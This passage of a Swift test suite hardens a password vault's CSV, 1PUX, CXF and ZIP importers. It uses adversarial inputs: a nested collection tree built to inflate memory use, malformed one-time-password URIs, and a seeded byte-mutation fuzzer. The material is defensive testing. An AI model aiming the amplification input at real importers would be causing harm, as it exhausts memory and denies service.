        for index in [2, 3] {
            let passkey = try #require(try result.entries[index].item.field(.passkey)?.passkeyCredential())
            #expect(passkey.largeBlob == nil)
        }
        #expect(
            result.report.warnings.map(\.warning) == [
                .unsupportedCredentialType("quantum-key"), .passkeyRefused(reason: "privateKey"),
                .passkeyDetailDropped("largeBlob"), .passkeyDetailDropped("largeBlob"),
            ])
        // Every passkey that did come through is within the bounds the vault enforces on its own fields.
        for entry in result.entries {
            for field in entry.item.fields where field.kind == .passkey {
                #expect(field.value.utf8.count <= PasskeyCredential.maximumFieldLength)
            }
        }
    }

    /// A7 nests collections under a long path and hangs thousands of siblings off the bottom, so that each sibling's
    /// full path, built as a tag, multiplies a few hundred kilobytes of file into gigabytes of memory.
    @Test("CXF: a collection tree cannot multiply its own size")
    func collectionAmplification() throws {
        let title = String(repeating: "t", count: 300)
        let leaves = (0..<1_500).map { #"{"title":"l\#($0)","items":[{"item":"a"}]}"# }.joined(separator: ",")
        var tree = #"{"title":"bottom","items":[{"item":"a"}],"subCollections":[\#(leaves)]}"#
        for _ in 0..<25 {
            tree = #"{"title":"\#(title)","items":[{"item":"a"}],"subCollections":[\#(tree)]}"#
        }
        let json =
            #"{"version":{"major":1,"minor":0},"accounts":[{"collections":[\#(tree)],"items":["#
            + #"{"id":"a","title":"A","credentials":[{"type":"note","content":{"fieldType":"string","value":"n"}}]}]}]}"#
        let result = try importCXF(json)
        let tags = try #require(result.entries.first?.item.tags)
        // Three levels fit in a kilobyte of path; nothing deeper becomes a tag, and nothing is longer than that.
        #expect(tags.count == 3)
        #expect(tags.allSatisfy { $0.utf8.count <= 1_024 })
    }

    /// A7 supplies one-time-password parameters chosen to break the code generator later: a period of zero, forty
    /// digits, an empty secret, a counter-based type.
    @Test(
        "A one-time password that could not work never becomes a working field",
        arguments: [
            "otpauth://totp/x?secret=GEZDGNBVGY3TQOJQ&period=0", "otpauth://totp/x?secret=GEZDGNBVGY3TQOJQ&digits=40",
            "otpauth://totp/x?secret=", "otpauth://totp/x", "otpauth://hotp/x?secret=GEZDGNBVGY3TQOJQ&counter=0",
            "otpauth://totp/x?secret=GEZDGNBVGY3TQOJQ&secret=MFRGGZDFMZTWQ2LK", "otpauth://totp/x?secret=AA",
            "otpauth://totp/x?secret=GEZDGNBVGY3TQOJQ&algorithm=MD5", "https://example.com/?secret=GEZDGNBVGY3TQOJQ",
            "0",
        ])
    func hostileOneTimePasswords(_ value: String) throws {
        let quoted = "\"" + value + "\""
        let csv = try importCSV(
            Array("Title,URL,Username,Password,Notes,OTPAuth\nSite,https://example.com,u,p,,\(quoted)\n".utf8))
        let onePUX = try importDocument(
            items(
                #"{"uuid":"a","overview":{"title":"Site"},"details":{"sections":[{"title":"","fields":[{"title":"code","id":"c","value":{"totp":"#
                    + quoted + "}}]}]}}"))
        for result in [csv, onePUX] {
            let item = try #require(result.entries.first?.item)
            #expect(item.field(.totp) == nil)
            let kept = try #require(item.fields.first { $0.value == value })
            #expect(kept.kind == .custom)
            #expect(
                result.report.warnings.contains { record in
                    if case .unusableOneTimePassword = record.warning { return true }
                    return false
                })
        }
    }

    // MARK: Everything, at random

    /// A7 does not know which byte will break a parser, so it tries many. Every parser must end every input in a
    /// value or an `InterchangeError`; a trap, a hang or any other error fails this test.
    @Test("Random and mutated files never crash a parser")
    func randomFiles() {
        var generator = SeededGenerator(seed: TestEnvironment.seed(fallback: 0xA7A7))
        let limits = InterchangeLimits(maximumInputBytes: 1 << 16, maximumDocumentBytes: 1 << 16, maximumItems: 64)
        let csvSeed = Array(
            "Title,URL,Username,Password,Notes,OTPAuth\r\n\"A \"\"b\"\"\",https://example.com/,u,\"p,\r\nq\",n,otpauth://totp/x?secret=GEZDGNBVGY3TQOJQ\r\n"
                .utf8)
        let onePUXSeed = Array(
            items(
                #"{"uuid":"a","state":"archived","favIndex":1,"createdAt":1,"categoryUuid":"001","overview":{"title":"T","url":"https://example.com","urls":[{"url":"x"}],"tags":["a"]},"details":{"loginFields":[{"value":"u","designation":"username"}],"notesPlain":"n","sections":[{"title":"s","fields":[{"title":"t","id":"i","value":{"totp":"GEZDGNBVGY3TQOJQ"}},{"title":"d","id":"e","value":{"date":1}}]}],"passwordHistory":[{"value":"o","time":1}]}}"#
            ).utf8)
        let cxfSeed = Array(
            #"{"version":{"major":1,"minor":0},"accounts":[{"username":"w","items":[{"id":"a","title":"T","scope":{"urls":["https://example.com"]},"credentials":[{"type":"basic-auth","username":{"fieldType":"string","value":"u"}},{"type":"totp","secret":"GEZDGNBVGY3TQOJQ","period":30,"digits":6,"algorithm":"sha1"},{"type":"passkey","credentialId":"AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8","rpId":"example.com","username":"u","userDisplayName":"U","userHandle":"dXNlcg","key":"MIGH","fido2Extensions":{"largeBlob":{"uncompressedSize":3,"data":"AQMA_P8BAgM"}}}]}]}]}"#
                .utf8)
        let zipSeed = ZIPFixture([
            ZIPFixture.Member(name: "export.data", contents: onePUXSeed, data: DeflateFixture.stored(onePUXSeed)),
            ZIPFixture.Member(name: "files/a", contents: [1, 2, 3], usesDataDescriptor: true),
        ]).bytes()
        let seeds = [csvSeed, onePUXSeed, cxfSeed, zipSeed]
        let interesting: [UInt8] = [
            0x00, 0x22, 0x2C, 0x0A, 0x0D, 0x5B, 0x5D, 0x7B, 0x7D, 0x5C, 0xFF, 0x80, 0x50, 0x4B, 0x3A, 0x2F,
        ]

        func run(_ parse: () throws -> Void) {
            do {
                try parse()
            } catch is InterchangeError {
                return
            } catch {
                Issue.record("untyped error \(error)")
            }
        }
        for _ in 0..<TestEnvironment.iterations(standard: 1_500, long: 150_000) {
            var bytes = seeds.randomElement(using: &generator)!
            switch Int.random(in: 0..<6, using: &generator) {
            case 0:
                bytes = (0..<Int.random(in: 0...200, using: &generator)).map { _ in
                    UInt8.random(in: 0...255, using: &generator)
                }
            case 1:
                bytes = Array(bytes[..<Int.random(in: 0...bytes.count, using: &generator)])
            case 2:
                let start = Int.random(in: 0..<bytes.count, using: &generator)
                let end = Int.random(in: start...bytes.count, using: &generator)
                bytes.insert(contentsOf: bytes[start..<end], at: Int.random(in: 0...bytes.count, using: &generator))
            case 3:
                let start = Int.random(in: 0..<bytes.count, using: &generator)
                bytes.removeSubrange(start..<min(bytes.count, start + Int.random(in: 1...16, using: &generator)))
            default:
                for _ in 0..<Int.random(in: 1...4, using: &generator) where !bytes.isEmpty {
                    bytes[Int.random(in: bytes.indices, using: &generator)] =
                        Bool.random(using: &generator)
                        ? interesting.randomElement(using: &generator)! : UInt8.random(in: 0...255, using: &generator)
                }
            }
            run { _ = try CSVReader.parse(bytes, limits: limits) }
            run { _ = try PasswordCSV.importFile(bytes, into: Self.vaultID, limits: limits, using: &generator) }
            run { _ = try OnePUX.importDocument(bytes, into: Self.vaultID, limits: limits, using: &generator) }
            run {
                _ = try CredentialExchange.importDocument(bytes, into: Self.vaultID, limits: limits, using: &generator)
            }
            run { _ = try OnePUX.importArchive(bytes, into: Self.vaultID, limits: limits, using: &generator) }
            run { _ = try Inflater.inflate(bytes, limits: limits) }
        }
    }
}
